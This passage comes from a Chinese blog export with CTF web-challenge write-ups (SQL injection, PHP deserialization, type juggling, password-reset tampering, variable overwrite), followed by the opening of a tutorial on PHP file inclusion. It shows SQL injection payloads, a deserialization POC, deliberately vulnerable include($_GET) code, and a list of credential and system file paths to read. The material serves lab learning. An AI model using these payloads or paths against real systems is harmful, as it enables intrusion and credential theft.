src="http://img-blog.csdnimg.cn/20190821225957828.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web18：SQL注入1"><a href="#Web18：SQL注入1" class="headerlink" title="Web18：SQL注入1"></a>Web18：SQL注入1</h3><p><img src="http://img-blog.csdnimg.cn/20190821231136391.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据题目描述，很明显是SQL注入。<br><img src="http://img-blog.csdnimg.cn/20190821231325658.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>点击Source，查看源码<br><img src="http://img-blog.csdnimg.cn/2019082123123492.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现当SQL查询有返回值，且user=”admin”时，即可得到flag。并且闭合方式为<code>&#39;)</code><br>所以构造payload：</p><pre><code class="php">admin&#39;)#</code></pre><p><img src="http://img-blog.csdnimg.cn/20190821233009758.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web19：pass-check"><a href="#Web19：pass-check" class="headerlink" title="Web19：pass check"></a>Web19：pass check</h3><p><img src="http://img-blog.csdnimg.cn/20190821233243126.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> <strong>strcmp() 函数</strong><br> strcmp() 函数比较两个字符串。strcmp() 函数是二进制安全的，且区分大小写。<br>     该函数返回：</p><blockquote><p>0 - 如果两个字符串相等<br>&lt;0 - 如果 string1 小于 string2<br>&gt;0 - 如果 string1 大于 string2</p></blockquote><p>代码审计一下：<br>1、post传参，且参数变量为pass，赋值给变量<code>$pass</code>。变量<code>$pass1</code>的值被隐藏。<br>2、如果设置了<code>$pass</code>，且strcmp() 函数返回0，即可得到flag。<br>3、要使strcmp() 函数返回0。可以<code>$pass==$pass1</code>，也可以strcmp(array,string)=null=0<br>4、所以使strcmp返回NULL就可以得到flag<br><img src="http://img-blog.csdnimg.cn/20190821235332550.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web20：起名字真难"><a href="#Web20：起名字真难" class="headerlink" title="Web20：起名字真难"></a>Web20：起名字真难</h3><p><img src="http://img-blog.csdnimg.cn/20190821235442429.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><a href="http://www.w3school.com.cn/php/func_string_ord.asp" target="_blank" rel="noopener">ord()函数</a><br>代码审计一下：<br>1、get传参，参数值通过自定义函数进行检查，对参数值的每一位进行检查。<br>2、如果ascii码<code>&gt;=</code>1的ascii且<code>&lt;=</code>9的ascii，返回false。即题目要求不能输入1-9数字，<br>3、但是输入的字符串必须和54975581388相同<br>4、所以可以用和54975581388等值的16进制表示(利用了php的弱类型的特性)<br>10进制转16进制<br><img src="http://img-blog.csdnimg.cn/2019082123571937.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>get传参，得到flag<br><img src="http://img-blog.csdnimg.cn/20190821235727989.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web21：密码重置"><a href="#Web21：密码重置" class="headerlink" title="Web21：密码重置"></a>Web21：密码重置</h3><p><img src="http://img-blog.csdnimg.cn/20190824184912576.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示账号为admin，要进行密码重置。打开题目<br><img src="http://img-blog.csdnimg.cn/20190824185214819.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>账号无法修改，只能重置账号ctfuser。所以抓包修改<br><img src="http://img-blog.csdnimg.cn/20190824185353603.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>发现<code>Y3RmdXNlcg==</code>比较特殊，是Base64加密的，解密结果发现是ctfuser<br><img src="http://img-blog.csdnimg.cn/20190824185529187.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>所以想着把admin进行Base64加密，<code>Y3RmdXNlcg==</code>替换成admin加密结果<br><img src="http://img-blog.csdnimg.cn/2019082418570711.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>Forward发包，得到flag<br><img src="http://img-blog.csdnimg.cn/20190824185745437.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web22：php-反序列化"><a href="#Web22：php-反序列化" class="headerlink" title="Web22：php 反序列化"></a>Web22：php 反序列化</h3><p>反序列化？！还好已经学习过。审计代码，开始做题<br><img src="http://img-blog.csdnimg.cn/20190824194417605.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>代码审计一下：<br>1、stripslashes()函数的作用是删除反斜杠，代码的意思是如果添加了反斜杠，则将反斜杠\删除。</p><pre><code class="php">if(get_magic_quotes_gpc()){    $pass=stripslashes($pass);}</code></pre><p>2、然后将pass进行反序列化操作，并赋值给变量o。</p><pre><code class="php">$o = unserialize($pass)；</code></pre><p>3、如果对象o赋值成功，将对象o的secret变量设置为*，并判断对象o的secret变量和enter变量是否相等，===判断数值及属性，如果相等输出flag。</p><pre><code class="php">if ($o) {    $o-&gt;secret = &quot;*&quot;;    if ($o-&gt;secret === $o-&gt;enter)        echo &quot;Congratulation! Here is my secret: &quot;.$o-&gt;secret;    else         echo &quot;Oh no... You can&#39;t fool me&quot;;}</code></pre><p>不知道secret的值。所以我们想到了引用a=&amp;b，即<a href="http://www.cnblogs.com/nul1/p/9418080.html" target="_blank" rel="noopener">PHP对象深浅拷贝</a><br>构造POC(在初始化的时候将<code>$this-&gt;enter=&amp;$this-&gt;secret</code>进行引用)：</p><pre><code class="php">&lt;?php class just4fun {    var $enter;    var $secret;    function just4fun()    {    $this-&gt;enter=&amp;$this-&gt;secret;    }    }echo serialize(new just4fun());?&gt;</code></pre><p>得到序列化字符串<code>O:8:&quot;just4fun&quot;:2:{s:5:&quot;enter&quot;;N;s:6:&quot;secret&quot;;R:2;}</code><br><img src="http://img-blog.csdnimg.cn/20190825164004599.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>构造payload得到flag(N表示NULL，R表示对象引用)：<br><img src="http://img-blog.csdnimg.cn/20190825164031397.jpg" alt="在这里插入图片描述"><br>提交flag发现不对，因为题有问题。。。。。。。<br><strong>PHP序列化格式详解</strong>：<br>a - array<br>b - boolean<br>d - double<br>i - integer<br>o - common object<br>r - reference<br>s - string<br>C - custom object<br>O - class<br>N - null<br>R - pointer reference<br>U - unicode string</p><h3 id="Web23：SQL-Injection"><a href="#Web23：SQL-Injection" class="headerlink" title="Web23：SQL Injection"></a>Web23：SQL Injection</h3><p><img src="http://img-blog.csdnimg.cn/20190825165012451.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示：反斜杠可以用来转义，仔细查看相关函数的用法<br>打开题目，查看源码<br><img src="http://img-blog.csdnimg.cn/20190825165158766.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>magic_quotes_gpc函数</strong><br>在php中的作用是判断解析用户提示的数据，如包括有：post、get、cookie过来的数据增加转义字符“\”，以确保这些数据不会引起程序，特别是数据库语句因为特殊字符引起的污染而出现致命的错误。<br>单引号（’）、双引号（”）、反斜线（\）与 NULL（NULL 字符）等字符都会被加上反斜线。这些转义是必须的，如果这个选项为Off，那么我们就必须调用addslashes这个函数来为字符串增加转义。<br><strong>stripslashes() 函数</strong><br>删除反斜杠<br><strong>htmlentities() 函数</strong><br>把字符转换为 HTML 实体</p><pre><code class="php">htmlentities($str, ENT_COMPAT); // 只转换双引号htmlentities($str, ENT_QUOTES); // 转换双引号和单引号htmlentities($str, ENT_NOQUOTES); // 不转换任何引号</code></pre><p>代码审计一下：<br>1、传入GET类型的username以及password，首先调用了clean方法<br>2、clean方法首先判断是否开启了添加反斜杠，如果添加了，使用stripslashes()删除反斜杠，然后调用htmlentities()方法将把字符转换为 HTML 实体,htmlentities($str, ENT_QUOTES); // 转换双引号和单引号<br>3、因为带反斜杠的单引号，被转义为字符了，无法参与闭合操作。下一步考虑的是将单引号闭合<br>4、可以通过反斜杠对单引号进行转义。<br>当我们输入username=admin&amp;password=123时，会将username后的单引号进行转义，构造语句如下：</p><pre><code class="sql">SELECT * FROM users WHERE name=&lt;font color=#FF0000 size=3&gt;&#39;&lt;/font&gt;admin&#39; AND pass=&lt;font color=#FF0000 size=3&gt;&#39;&lt;/font&gt;123&#39;</code></pre><p>所以将第一个单引号和第三个单引号进行闭合。</p><pre><code class="sql">SELECT * FROM users WHERE name=&lt;font color=#FF0000 size=3&gt;&#39;&lt;/font&gt;admin&#39; AND pass=&lt;font color=#FF0000 size=3&gt;&#39;&lt;/font&gt; or 1 #&#39;</code></pre><p>payload</p><pre><code>?username=admin\&amp;password=or 1 %23</code></pre><p>或</p><pre><code class="php">?username=admin\&amp;password=or 1=1--+</code></pre><p><img src="http://img-blog.csdnimg.cn/20190825170306244.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web24：综合题"><a href="#Web24：综合题" class="headerlink" title="Web24：综合题"></a>Web24：综合题</h3><p>题目描述没提示，查看题目<br><img src="http://img-blog.csdnimg.cn/20190825171009772.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>我也不知道是什么玩意儿。不过之前做过颜文字aaencode，看着两者比较像，想着是不是可以用谷歌的Console，发现可以。<br><img src="http://img-blog.csdnimg.cn/20190825171110362.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>不过还是了解一下这是什么编码。看大佬博客发现这是jsfuck编码。可使用浏览器控制台直接解密，也可使用<a href="http://web2hack.org/xssee/" target="_blank" rel="noopener">在线JSfuck解密工具</a>。<br>访问得到的php文件<br><img src="http://img-blog.csdnimg.cn/20190825172114675.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示：TIP在我脑袋里，在文件的header里发现了history of bash<br><img src="http://img-blog.csdnimg.cn/20190825172301336.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>百度一下history of bash。发现在Unix中 , 会生成一个 <code>.bash_history</code> 的文件 , 记录了用户的操作历史<br>尝试访问这个文件 :<br><img src="http://img-blog.csdnimg.cn/20190825172454875.jpg" alt="在这里插入图片描述"><br>在bash_history中记录了执行压缩包的操作，所以我们访问以下flagbak.zip<br><a href="http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip" target="_blank" rel="noopener">http://teamxlc.sinaapp.com/web3/b0b0ad119f425408fc3d45253137d33d/flagbak.zip</a><br>开始自动下载文件，打开后得到flag！<br><strong>system</strong>题崩了。。。</p><h3 id="Web25：SQL注入2"><a href="#Web25：SQL注入2" class="headerlink" title="Web25：SQL注入2"></a>Web25：SQL注入2</h3><p><img src="http://img-blog.csdnimg.cn/20190825172804487.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目提示union查询。打开题目，点击Source，查看源码<br><img src="http://img-blog.csdnimg.cn/20190825173359146.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>strcasecmp() 函数</strong><br>strcasecmp(string1,string2)比较两个字符串。<br>该函数返回：</p><blockquote><p>0 - 如果两个字符串相等<br>&lt;0 - 如果 string1 小于 string2<br>&gt;0 - 如果 string1 大于 string2</p></blockquote><p>代码审计一下：<br>1、post传入user赋值给<code>$user</code>，传入pass经md5加密赋值给<code>$pass</code><br>2、<code>$query</code>等于查询pw字段返回结果。如果有返回值，则<code>$query[pw]</code>为ture，否则为false<br>3、如果变量存在，并且，<code>$pass</code>与<code>$query[pw]</code>相等（不区分大小写）,输出flag<br>所以考虑在<code>$user</code>上加上一个union语句，即向$query的结果集中在加一条。<br>payload</p><pre><code class="sql">&#39; union select md5(123)#&amp;pass=123</code></pre><p><img src="http://img-blog.csdnimg.cn/20190825173014698.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web26：密码重置2"><a href="#Web26：密码重置2" class="headerlink" title="Web26：密码重置2"></a>Web26：密码重置2</h3><p><img src="http://img-blog.csdnimg.cn/20190825174726208.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>依旧是密码重置，题目有三条提示：</p><ol><li>管理员邮箱观察一下就可以找到</li><li>linux下一般使用vi编辑器，并且异常退出会留下备份文件</li><li>弱类型bypass</li></ol><p>查看源码，发现管理员邮箱<br><img src="http://img-blog.csdnimg.cn/20190825175031327.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>百度一下，vi编辑器异常退出会留下的备份文件：<br>第一次产生的交换文件名为“.file.txt.swp”；再次意外退出后，将会产生名为“.file.txt.swo”的交换文件；而第三次产生的交换文件则为“.file.txt.swn”；依此类推。<br>由此再次查看源码<br><img src="http://img-blog.csdnimg.cn/20190825175555416.jpg" alt="在这里插入图片描述"><br>发现<code>submit.php</code>，所以访问<code>.submit.php.swp</code>，得到验证源码<br><img src="http://img-blog.csdnimg.cn/20190825175225681.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>代码审计一下：<br><code>$token</code>长度为10，数值为0，并且邮箱号和token不为空。<br>所以输入刚才的管理员邮箱，token为<code>0000000000</code><br>最终，得到flag<br><img src="http://img-blog.csdnimg.cn/20190825180235766.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="http://img-blog.csdnimg.cn/20190825180245892.jpg" alt="在这里插入图片描述"></p><h3 id="Web27：file-get-contents"><a href="#Web27：file-get-contents" class="headerlink" title="Web27：file_get_contents"></a>Web27：file_get_contents</h3><p><img src="http://img-blog.csdnimg.cn/2019082518035053.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>题目标题file_get_contents，想到之前学文件包含漏洞时遇到过<br>file_get_contents() 函数把整个文件读入一个字符串中。<br>打开题目查看源码<br><img src="http://img-blog.csdnimg.cn/20190825180605396.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>传入一个文件，经file_get_contents() 函数把整个文件读入一个字符串中，如果字符串等于meizijiu，得到flag。<br>想到了学文件包含漏洞时的php伪协议<br>这里应该是php://input (读取POST数据)。<a href="http://blog.csdn.net/TongWaccs/article/details/78401042" target="_blank" rel="noopener">file_get_contents(“php://input”)的使用方法</a><br>php伪协议也是可以利用http协议的，即可以使用POST方式传数据<br><img src="http://img-blog.csdnimg.cn/20190825181420270.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h3 id="Web28：变量覆盖"><a href="#Web28：变量覆盖" class="headerlink" title="Web28：变量覆盖"></a>Web28：变量覆盖</h3><p><img src="http://img-blog.csdnimg.cn/20190825181801277.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>提示：变量覆盖<br>打开题目，查看源码<br><img src="http://img-blog.csdnimg.cn/20190825181839348.jpg" alt="在这里插入图片描述"><br>emmm。。。不会，查看大佬<a href="http://www.luyixian.cn/news_show_169455.aspx" target="_blank" rel="noopener">博客</a><br><strong>分析代码</strong>：可变变量key获取了一个普通变量value的值作为这个可变变量的变量名。使用foreach来遍历数组中的值，再将获取到的数组键名作为变量，数组中的键值作为变量的值。因此就产生了变量覆盖漏洞。<br>通过地址栏进行GET传参，变量覆盖便形成了</p><pre><code class="php">$$key = $name$value = meizijiu233$name == &quot;meizijiu233&quot;</code></pre><p>所以得到flag<br><img src="http://img-blog.csdnimg.cn/20190825182622419.jpg" alt="在这里插入图片描述"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> 南邮 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件包含漏洞</title>
      <link href="/2019/08/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
      <url>/2019/08/21/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>因为之前做过文件包含漏洞的Web题，了解了一点文件包含漏洞的一些知识，但并没有总结。所以现在重新学习并总结了一下文件包含漏洞。</p><h3 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h3><p><strong>文件包含的简介</strong></p><p>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码，并且当PHP来执行，这会为开发者节省大量的时间。这意味着您可以创建供所有网页引用的标准页眉或菜单文件。当页眉需要更新时，您只更新一个包含文件就可以了，或者当您向网站添加一张新页面时，仅仅需要修改一下菜单文件（而不是更新所有网页中的链接）。</p><p><strong>文件包含的原理</strong></p><p>PHP中提供了四个文件包含的函数，分别是include()、include_once()、require()和require_once()。这四个函数都可以进行文件包含，但作用并不一样。</p><blockquote><ul><li>require：找不到被包含的文件时会产生致命错误，并停止脚本。</li><li>include：找不到被包含的文件时只会产生警告，脚本将继续执行。</li><li>include_once：和include()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</li><li>require_once：和require()语句类似，唯一区别是如果该文件中的代码已经被包含，则不会再次包含。</li></ul></blockquote><p><strong>文件包含的分类</strong><br><em>PHP中的文件包含分为本地包含和远程包含。</em><br>1、本地包含 Local File Include (LFI)</p><blockquote><p>1.所包含文件内容符合PHP语法规范：任何扩展名都可以被PHP解析。<br>2.包含非PHP语法规范源文件，会暴露其源代码。</p></blockquote><p><em>例如：</em><br><code>test1.php</code>代码如下：</p><pre><code class="php">&lt;?php$a=&#39;abc&#39;;echo $a; ?&gt;</code></pre><p><code>test2.php</code>代码如下：</p><pre><code class="php">&lt;?php include(&quot;test1.php&quot;); ?&gt;</code></pre><p>执行<code>test2.php</code>，会输出  abc。</p><p>如果<code>test2.php</code>包含的是一个 txt文件，并且这个txt文件内容符合php语法规则，则txt文件会被当成php文件执行。如果包含非php语法规则的内容，则会暴露其源代码。</p><p>2、远程包含 Remote File Include (RFI)<br>如果要使用远程包含功能，首先需要确定PHP是否已经开启远程包含功能选项（php默认关闭远程包含功能：allow_url_include=off），开启远程包含功能需要在<code>php.ini</code>配置文件中修改。</p><blockquote><p>远程包含与本地包含没有区别，无论是哪种扩展名，只要遵循PHP语法规范，PHP解析器就会对其解析。</p></blockquote><p><em>例如：</em><br>创建<code>abc.txt</code>文件，文件内容符合PHP语法规则。<br>我们将<code>test2.php</code>的内容修改为：</p><pre><code class="php">&lt;?php include($_GET[&#39;page&#39;]); ?&gt;</code></pre><p>此时，在url中输入：<code>http://www.XXXX.com/test2.php?page=http://www.XXXX.com/abc.txt</code><br>将会执行<code>abc.txt</code>的内容。</p><p><strong>文件包含漏洞的成因</strong></p><p>在包含文件时候，为了灵活包含文件，将被包含文件设置为变量，通过动态变量来引入需要包含的文件时，用户可以对变量的值可控而服务器端未对变量值进行合理地校验或者校验被绕过，这样就导致了文件包含漏洞。通常文件包含漏洞出现在PHP语言中。<br><em>例如：</em></p><pre><code class="php">&lt;?php$filename  = $_GET[&#39;filename&#39;];include($filename);?&gt;</code></pre><p><code>$_GET[&#39;filename&#39;]</code>参数开发者没有经过严格的过滤，直接带入了include的函数，攻击者可以修改<code>$_GET[&#39;filename&#39;]</code>的值，执行非预期的操作。</p><p><strong>文件包含漏洞的危害</strong></p><p>通过文件包含漏洞，可以读取系统中的敏感文件，源代码文件等，如密码文件，通过对密码文件进行暴力破解。若破解成功则可获取操作系统的用户账户，甚至可通过开放的远程连接服务进行连接控制。另外不管是本地文件包含还是远程文件包含，文件包含漏洞还可能导致执行任意代码。</p><h3 id="文件包含漏洞分类"><a href="#文件包含漏洞分类" class="headerlink" title="文件包含漏洞分类"></a>文件包含漏洞分类</h3><h4 id="1、本地文件包含漏洞"><a href="#1、本地文件包含漏洞" class="headerlink" title="1、本地文件包含漏洞"></a>1、本地文件包含漏洞</h4><blockquote><p>当包含的文件在服务器本地时，就形成了本地文件包含。</p></blockquote><h5 id="1-无限制本地文件包含漏洞"><a href="#1-无限制本地文件包含漏洞" class="headerlink" title="1.无限制本地文件包含漏洞"></a>1.无限制本地文件包含漏洞</h5><p><strong>测试代码</strong>：</p><pre><code class="php">&lt;?php$filename  = $_GET[&#39;filename&#39;];include($filename);?&gt;</code></pre><p><strong>测试结果</strong>：<br>通过目录遍历漏洞可以获取到系统中其他文件的内容。</p><p><img src="http://img-blog.csdnimg.cn/20190820184642984.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQzNjI1OTE3,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><strong>常见的敏感信息路径：</strong><br>Windows系统</p><blockquote><p>c:\boot.ini // 查看系统版本<br>c:\windows\system32\inetsrv\MetaBase.xml // IIS配置文件<br>c:\windows\repair\sam // 存储Windows系统初次安装的密码<br>c:\ProgramFiles\mysql\my.ini // MySQL配置<br>c:\ProgramFiles\mysql\data\mysql\user.MYD // MySQL root密码<br>c:\windows\php.ini // php 配置信息</p></blockquote><p>Linux/Unix系统</p><blockquote><p>/etc/passwd // 账户信息<br>/etc/shadow // 账户密码文件<br>/usr/local/app/apache2/conf/httpd.conf // Apache2默认配置文件<br>/usr/local/app/apache2/conf/extra/httpd-vhost.conf // 虚拟网站配置<br>/usr/local/app/php5/lib/php.ini // PHP相关配置<br>/etc/httpd/conf/httpd.conf // Apache配置文件<br>/etc/my.conf // mysql 配置文件</p></blockquote><h5 id="2-session文件包含漏洞"><a href="#2-session文件包含漏洞" class="headerlink" title="2.session文件包含漏洞"></a>2.session文件包含漏洞</h5><p><strong>条件：</strong><br>session的存储位置可以获取。<br><strong>session存储位置的获取</strong></p><p>1、通过phpinfo的信息可以获取到session的存储位置。<br>通过phpinfo的信息，获取到session.save_path为<code>/var/lib/php/sessions</code>：<br><img src="http://img-blog.csdnimg.cn/20190820185516735.jpg" alt="在这里插入图片描述"><br>2、 通过猜测默认的session存放位置进行尝试。</p><blockquote><p>linux下默认存储在<code>/var/lib/php/session(s)</code>目录下。<br>windows下(如果用的是phpstudy集成环境，且phpstudy在C盘根目录的话)默认存储在<code>C:\phpStudy\PHPTutorial\tmp\tmp</code></p></blockquote><p>session中的内容可以被控制，传入恶意代码。<br><strong>示例代码：</strong></p><pre><code class="php">&lt;?phpsession_start();$ctfs=$_GET[&#39;ctfs&#39;];$_SESSION[&quot;username&quot;]=$ctfs;?&gt;</code></pre><p><strong>漏洞分析</strong></p><p>此php会将获取到的GET型ctfs变量的值存入到session中。<br>当访问<code>http://www.XXXX.com/LFI2.php?ctfs=ctfs</code> 后，会在<code>/var/lib/php/sessions</code>目录下存储session的值。<br>session的文件名为<code>sess_+sessionid</code>，sessionid可以通过开发者模式获取。<br><img src="http://img-blog.csdnimg.cn/20190820201458938.jpg" alt="在这里插入图片描述"><br>所以session的文件名为sess_aisf1tieidskl22nlc4hqf60h5。<br>到服务器的<code>/var/lib/php/sessions</code>目录下查看果然存在此文件，内容为：<br><img src="http://img-blog.csdnimg.cn/2019082020223390.jpg" 